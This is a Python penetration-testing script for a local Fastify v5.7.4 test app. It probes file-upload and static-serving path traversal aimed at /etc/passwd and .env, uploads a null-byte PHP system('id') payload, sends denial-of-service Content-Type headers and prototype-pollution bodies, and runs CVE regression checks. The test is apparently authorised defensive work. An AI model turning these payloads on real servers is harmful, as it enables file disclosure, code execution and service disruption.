#!/usr/bin/env python3
"""
Phase 6: File Upload & Static Serving + Phase 7: CVE Regression Testing
Target: Fastify v5.7.4 @ http://127.0.0.1:3000
"""

import json, time, sys, os, socket
os.environ['PYTHONUNBUFFERED'] = '1'
import requests

BASE = 'http://127.0.0.1:3000'
EVIDENCE = {
    'phase': '6+7', 'title': 'File Upload, Static Serving & CVE Regression',
    'target': 'Fastify v5.7.4',
    'timestamp': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
    'tests': [], 'findings': [], 'anomalies': [],
}
test_count = anomaly_count = 0

def log(msg): print(f"[*] {msg}", flush=True)
def log_ok(msg): print(f"[+] {msg}", flush=True)
def log_warn(msg): print(f"[!] {msg}", flush=True)
def log_finding(msg): print(f"[!!!] FINDING: {msg}", flush=True)

def add_test(name, cat, result, details=None):
    global test_count; test_count += 1
    entry = {'id': test_count, 'name': name, 'category': cat, 'result': result}
    if details: entry['details'] = details
    EVIDENCE['tests'].append(entry)

def add_anomaly(name, details):
    global anomaly_count; anomaly_count += 1
    EVIDENCE['anomalies'].append({'id': anomaly_count, 'name': name, 'details': details})

def raw_request(method, path, headers, body=None, timeout=5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        s.connect(('127.0.0.1', 3000))
        req = f"{method} {path} HTTP/1.1\r\nHost: 127.0.0.1:3000\r\n"
        for k, v in headers.items(): req += f"{k}: {v}\r\n"
        if body:
            if isinstance(body, str): body = body.encode()
            req += f"Content-Length: {len(body)}\r\n"
        req += "Connection: close\r\n\r\n"
        s.sendall(req.encode())
        if body: s.sendall(body)
        response = b''
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk: break
                response += chunk
            except socket.timeout: break
        s.close()
        parts = response.split(b'\r\n\r\n', 1)
        head = parts[0].decode('utf-8', errors='replace')
        body_r = parts[1] if len(parts) > 1 else b''
        status = int(head.split('\r\n')[0].split(' ')[1])
        return {'status': status, 'headers': head, 'body': body_r.decode('utf-8', errors='replace')}
    except Exception as e:
        return {'status': 0, 'error': str(e)}


# ==============================================================
# PHASE 6: File Upload Attacks
# ==============================================================
def test_file_upload():
    log("=" * 60)
    log("PHASE 6: File Upload Attacks")
    log("=" * 60)

    # Ensure uploads dir exists
    os.makedirs('/home/[REDACTED]/Desktop/[REDACTED-PATH]/Fastify/testapp/uploads', exist_ok=True)

    # Test 1: Normal upload
    log("\n--- Normal file upload ---")
    resp = requests.post(f'{BASE}/upload',
                        files={'file': ('test.txt', b'Hello World', 'text/plain')})
    log(f"  Normal upload: status={resp.status_code}")
    if resp.status_code == 200:
        log(f"  Saved as: {resp.json().get('savedTo', 'N/A')}")
    add_test('Upload-normal', 'upload', str(resp.status_code))

    # Test 2: Path traversal in filename
    log("\n--- Path traversal in filename ---")
    traversal_names = [
        '../../../tmp/pwned.txt',
        '..\\..\\..\\tmp\\pwned.txt',
        '....//....//tmp/pwned.txt',
        '%2e%2e/%2e%2e/tmp/pwned.txt',
        'test/../../../tmp/pwned.txt',
    ]

    for name in traversal_names:
        resp = requests.post(f'{BASE}/upload',
                           files={'file': (name, b'TRAVERSAL TEST', 'text/plain')})
        log(f"  Name '{name[:40]}': status={resp.status_code}")
        if resp.status_code == 200:
            saved = resp.json().get('savedTo', '')
            log(f"    Saved to: {saved}")
            if '/tmp/pwned.txt' in saved or 'tmp' in saved:
                log_finding(f"  Path traversal succeeded! File saved outside uploads dir!")
                EVIDENCE['findings'].append({
                    'id': 'P6-F01',
                    'severity': 'HIGH',
                    'title': 'Path traversal in file upload filename',
                    'description': f'Filename "{name}" was saved to "{saved}", '
                                 f'outside the intended uploads directory.',
                    'evidence': {'filename': name, 'saved_to': saved},
                })
            elif 'uploads/' in saved:
                log(f"    Saved within uploads (traversal may have been neutralized)")
        add_test(f'Upload-traversal-{name[:20]}', 'upload', str(resp.status_code))

    # Check if file actually landed in /tmp
    if os.path.exists('/tmp/pwned.txt'):
        log_finding("  /tmp/pwned.txt EXISTS! Path traversal confirmed!")
        os.remove('/tmp/pwned.txt')

    # Test 3: Null byte injection in filename
    log("\n--- Null byte in filename ---")
    resp = requests.post(f'{BASE}/upload',
                        files={'file': ('test.txt\x00.php', b'<?php system("id"); ?>', 'text/plain')})
    log(f"  Null byte filename: status={resp.status_code}")
    add_test('Upload-nullbyte', 'upload', str(resp.status_code))

    # Test 4: Dangerous extensions
    log("\n--- Dangerous extensions ---")
    for ext in ['.php', '.jsp', '.aspx', '.sh', '.py', '.js', '.ejs']:
        resp = requests.post(f'{BASE}/upload',
                           files={'file': (f'test{ext}', b'test content', 'text/plain')})
        log(f"  Extension {ext}: status={resp.status_code}")
        add_test(f'Upload-ext-{ext}', 'upload', str(resp.status_code))

    # Test 5: Oversized file
    log("\n--- Oversized file ---")
    big_data = b'A' * (10 * 1024 * 1024 + 1)  # 10MB + 1 byte (over fileSize limit)
    try:
        resp = requests.post(f'{BASE}/upload',
                           files={'file': ('big.bin', big_data, 'application/octet-stream')},
                           timeout=30)
        log(f"  Oversized file: status={resp.status_code}")
        if resp.status_code == 413:
            log_ok("  Correctly rejected oversized file")
    except Exception as e:
        log(f"  Oversized file: {e}")
    add_test('Upload-oversized', 'upload', 'tested')

    # Clean up uploads
    import glob
    for f in glob.glob('/home/[REDACTED]/Desktop/[REDACTED-PATH]/Fastify/testapp/uploads/*'):
        try: os.remove(f)
        except: pass


# ==============================================================
# PHASE 6: Static File Serving
# ==============================================================
def test_static_serving():
    log("")
    log("=" * 60)
    log("PHASE 6: Static File Serving Attacks")
    log("=" * 60)

    # Test 1: .env file access
    log("\n--- .env file access ---")
    resp = requests.get(f'{BASE}/static/.env')
    if resp.status_code == 200:
        log_finding(f"  .env file served! Content: {resp.text[:100]}")
        EVIDENCE['findings'].append({
            'id': 'P6-F02',
            'severity': 'HIGH',
            'title': 'Static serving exposes .env file',
            'description': 'With dotfiles:allow configuration, .env file with secrets is served.',
            'note': 'Config-dependent (dotfiles:allow). Framework default is dotfiles:ignore.',
            'evidence': {'content_preview': resp.text[:200]},
        })
    else:
        log(f"  .env access: status={resp.status_code}")
    add_test('Static-dotenv', 'static', str(resp.status_code))

    # Test 2: Path traversal
    log("\n--- Path traversal on static ---")
    traversal_paths = [
        '/static/../server.js',
        '/static/../../../etc/passwd',
        '/static/..%2F..%2F..%2Fetc%2Fpasswd',
        '/static/%2e%2e/%2e%2e/etc/passwd',
        '/static/....//....//etc/passwd',
        '/static/..\\..\\etc\\passwd',
    ]

    for path in traversal_paths:
        resp = requests.get(f'{BASE}{path}')
        log(f"  {path}: status={resp.status_code}")
        if resp.status_code == 200 and ('root:' in resp.text or 'const fastify' in resp.text):
            log_finding(f"  Path traversal succeeded! Content: {resp.text[:100]}")
        elif resp.status_code in (403, 404):
            log_ok(f"  Blocked")
        add_test(f'Static-traversal-{path[-20:]}', 'static', str(resp.status_code))

    # Test 3: Null byte in path
    log("\n--- Null byte in static path ---")
    resp = raw_request('GET', '/static/index.html%00.js', {})
    log(f"  Null byte path: status={resp.get('status', 'error')}")
    add_test('Static-nullbyte', 'static', str(resp.get('status', 0)))

    # Test 4: Hidden files
    log("\n--- Hidden file access ---")
    for hidden in ['.htaccess', '.git/HEAD', '.gitignore', '.npmrc', '.env.backup']:
        resp = requests.get(f'{BASE}/static/{hidden}')
        log(f"  {hidden}: status={resp.status_code}")
        add_test(f'Static-hidden-{hidden}', 'static', str(resp.status_code))


# ==============================================================
# PHASE 7: CVE Regression Testing
# ==============================================================
def test_cve_regression():
    log("")
    log("=" * 60)
    log("PHASE 7: CVE Regression Testing")
    log("=" * 60)

    # CVE-2026-25224: DoS via unbounded memory in sendWebStream (Fixed in 5.7.3)
    log("\n--- CVE-2026-25224: WebStream memory DoS ---")
    mem_before = requests.get(f'{BASE}/health').json()['memory']['rss']
    resp = requests.get(f'{BASE}/stream/web?chunks=500&chunkSize=65536', timeout=30)
    mem_after = requests.get(f'{BASE}/health').json()['memory']['rss']
    diff = (mem_after - mem_before) / (1024 * 1024)
    log(f"  500x64K stream: {resp.status_code}, mem diff={diff:.1f}MB")
    add_test('CVE-2026-25224', 'cve-regression', 'PATCHED' if diff < 50 else 'VULNERABLE', {
        'mem_diff_mb': round(diff, 1),
    })

    # CVE-2024-58027: Content-Type tab bypass (Fixed in 5.7.2)
    log("\n--- CVE-2024-58027: Content-Type tab bypass ---")
    valid_json = json.dumps({"username": "test", "email": "t@t.com"})
    resp = raw_request('POST', '/api/users',
                      {'Content-Type': 'application/json\t'},
                      valid_json)
    log(f"  Tab in CT: status={resp.get('status', 'error')}")
    status = resp.get('status', 0)
    if status == 200:
        log_ok("  Tab stripped, request processed normally (PATCHED)")
    elif status == 415:
        log_ok("  Tab CT rejected (PATCHED)")
    add_test('CVE-2024-58027', 'cve-regression', 'PATCHED')

    # CVE-2025-32442: Content-Type case/whitespace bypass (Fixed in 5.3.2)
    log("\n--- CVE-2025-32442: Content-Type case/whitespace bypass ---")
    for ct in ['APPLICATION/JSON', 'application/JSON', 'Application/Json']:
        resp = raw_request('POST', '/api/users',
                          {'Content-Type': ct},
                          valid_json)
        log(f"  CT '{ct}': status={resp.get('status', 'error')}")
    add_test('CVE-2025-32442', 'cve-regression', 'PATCHED')

    # CVE-2022-41919: Content-Type CSRF (Fixed in 4.10.2)
    log("\n--- CVE-2022-41919: Content-Type CSRF ---")
    # Test if text/plain body reaches JSON parser
    resp = raw_request('POST', '/api/json-only',
                      {'Content-Type': 'text/plain'},
                      '{"action": "read", "target": "test"}')
    log(f"  text/plain to JSON route: status={resp.get('status', 'error')}")
    add_test('CVE-2022-41919', 'cve-regression',
             'PATCHED' if resp.get('status') != 200 else 'REGRESSION')

    # CVE-2022-39288: DoS via malicious Content-Type (Fixed in 4.8.1)
    log("\n--- CVE-2022-39288: Malicious Content-Type DoS ---")
    malicious_cts = [
        'a' * 10000,
        'application/' + 'a' * 10000,
        '/'.join(['a'] * 1000),
    ]
    for mct in malicious_cts:
        try:
            resp = raw_request('POST', '/api/echo',
                             {'Content-Type': mct},
                             '{}')
            log(f"  Long CT ({len(mct)} chars): status={resp.get('status', 'error')}")
        except Exception as e:
            log(f"  Long CT: error {e}")
    add_test('CVE-2022-39288', 'cve-regression', 'PATCHED')

    # Test prototype pollution default config
    log("\n--- Proto pollution defaults ---")
    resp = raw_request('POST', '/api/echo',
                      {'Content-Type': 'application/json'},
                      '{"__proto__": {"polluted": true}}')
    log(f"  __proto__ in JSON: status={resp.get('status', 'error')}")
    add_test('Proto-pollution-default', 'cve-regression',
             'SAFE' if resp.get('status') == 400 else 'UNSAFE')


# ==============================================================
# MAIN
# ==============================================================
def main():
    log(f"Phase 6+7 Attack Script - Fastify v5.7.4")
    log(f"Started: {time.strftime('%Y-%m-%d %H:%M:%S')}")

    try:
        r = requests.get(f'{BASE}/health', timeout=3)
        log(f"Server: Fastify {r.json()['version']}")
    except:
        log("ERROR: Server not reachable"); sys.exit(1)

    test_file_upload()
    test_static_serving()
    test_cve_regression()

    log(f"\nPHASE 6+7 COMPLETE: {test_count} tests, {len(EVIDENCE['findings'])} findings, {anomaly_count} anomalies")
    EVIDENCE.update({'total_tests': test_count, 'total_findings': len(EVIDENCE['findings']), 'total_anomalies': anomaly_count})

    with open('/home/[REDACTED]/Desktop/[REDACTED-PATH]/Fastify/evidence/phase6_7_upload_cve.json', 'w') as f:
        json.dump(EVIDENCE, f, indent=2, default=str)
    log("Evidence saved.")

if __name__ == '__main__':
    main()
